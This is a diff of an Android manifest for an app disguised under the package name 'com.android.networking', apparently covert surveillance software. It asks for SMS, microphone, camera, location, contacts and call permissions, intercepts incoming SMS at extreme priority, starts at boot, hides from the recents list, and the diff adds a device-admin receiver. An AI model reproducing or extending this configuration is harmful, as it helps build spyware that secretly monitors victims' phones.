@@ -1,95 +1,118 @@
 <?xml version="1.0" encoding="utf-8"?>
-
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-	package="com.android.networking" android:versionCode="1"
-	android:versionName="1.0">
-	<!-- QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS -->
-	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-	<uses-permission android:name="android.permission.WRITE_SMS" />
-	<uses-permission android:name="android.permission.VIBRATE" />
-	<uses-permission android:name="android.permission.SEND_SMS" />
-	<uses-permission android:name="android.permission.RECEIVE_SMS" />
-	<uses-permission android:name="android.permission.READ_SMS" />
-	<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
-	<uses-permission android:name="android.permission.INTERNET" />
-	<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
-	<uses-permission android:name="android.permission.CAMERA" />
-	<uses-permission android:name="android.permission.FLASHLIGHT" />
-	<uses-permission android:name="android.permission.CALL_PHONE" />
-	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-	<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-	<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-	<uses-permission android:name="android.permission.READ_PHONE_STATE" />
-	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-	<uses-permission android:name="android.permission.RECORD_AUDIO" />
-	<uses-permission android:name="android.permission.READ_CONTACTS" />
-	<uses-permission android:name="android.permission.READ_CALENDAR" />
-	<uses-permission android:name="android.permission.READ_LOGS" />
-	<uses-permission android:name="android.permission.SET_WALLPAPER" />
-	<uses-permission android:name="android.permission.WAKE_LOCK" />
-	<uses-permission android:name="android.permission.USER_PRESENT" />
-	<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    package="com.android.networking"
+    android:versionCode="1"
+    android:versionName="1.0" >
 
-	<uses-sdk android:minSdkVersion="8"  android:targetSdkVersion="10" />
-	
-	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="true" android:allowBackup="false">
-	
-		<activity android:name="com.android.networking.gui.AGUI"
-			android:label="@string/app_name" android:excludeFromRecents="true"
-			android:enabled="true">
-			<intent-filter>
-				<action android:name="android.intent.action.MAIN" />
-				<category android:name="android.intent.category.LAUNCHER" />
-			</intent-filter>
-		</activity>
-		
-		<activity android:name="com.android.networking.gui.CGui"
-			android:label="cgui" android:excludeFromRecents="true"
-			android:enabled="true" android:theme="@style/Theme.Tr6871623">
-		</activity>
+    <!-- QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.FLASHLIGHT" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALENDAR" />
+    <uses-permission android:name="android.permission.READ_LOGS" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.USER_PRESENT" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
 
-		<service android:name="com.android.networking.ServiceMain" android:exported="false"
-			android:excludeFromRecents="true">
-			<intent-filter>
-				<action android:name="com.android.networking.app"/>		
-			</intent-filter>
-		</service>
+    <uses-sdk
+        android:minSdkVersion="8"
+        android:targetSdkVersion="10" />
 
-		<receiver android:name="com.android.networking.BM">
-			<intent-filter>
-				<action android:name="android.intent.action.BOOT_COMPLETED" />
-				<action android:name="android.intent.action.USER_PRESENT" />
-			</intent-filter>
-			
-			<intent-filter android:priority="65535">
+    <application
+        android:allowBackup="false"
+        android:debuggable="true"
+        android:icon="@drawable/icon"
+        android:label="@string/app_name" >
+        <activity
+            android:name="com.android.networking.gui.AGUI"
+            android:enabled="true"
+            android:excludeFromRecents="true"
+            android:label="@string/app_name" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name="com.android.networking.gui.CGui"
+            android:enabled="true"
+            android:excludeFromRecents="true"
+            android:label="cgui"
+            android:theme="@style/Theme.Tr6871623" >
+        </activity>
+
+        <service
+            android:name="com.android.networking.ServiceMain"
+            android:excludeFromRecents="true"
+            android:exported="false" >
+            <intent-filter>
+                <action android:name="com.android.networking.app" />
+            </intent-filter>
+        </service>
+
+        <receiver android:name="com.android.networking.BM" >
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+            <intent-filter android:priority="65535" >
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
-		</receiver>
+        </receiver>
+        <receiver android:name="com.android.networking.listener.BAc" >
+        </receiver>
+        <receiver android:name="com.android.networking.listener.BSt" >
+        </receiver>
+        <receiver android:name="com.android.networking.listener.BSm" >
+            <intent-filter android:priority="999999999" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.android.networking.listener.BC"
+            android:exported="true" >
+            <intent-filter android:priority="0" >
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                <action android:name="android.intent.action.PHONE_STATE" />
 
-		<receiver android:name="com.android.networking.listener.BAc">
-		</receiver>
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.android.networking.listener.AR"
+            android:permission="android.permission.BIND_DEVICE_ADMIN" >
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED" />
+                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLED" />
+            </intent-filter>
+            <meta-data
+            android:name="android.app.device_admin"
+            android:resource="@xml/device_a" />
+        </receiver>
 
-		<receiver android:name="com.android.networking.listener.BSt">
-		</receiver>
+        
+    </application>
 
-		<receiver android:name="com.android.networking.listener.BSm">
-			<intent-filter android:priority="999999999">
-				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
-			</intent-filter>
-		</receiver>
-
-		<receiver android:name="com.android.networking.listener.BC"
-			android:exported="true">
-			<intent-filter android:priority="0">
-				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-				<action android:name="android.intent.action.PHONE_STATE" />
-				<category android:name="android.intent.category.DEFAULT" />
-			</intent-filter>
-		</receiver>
-	</application>
-
-
-</manifest> 
+</manifest>
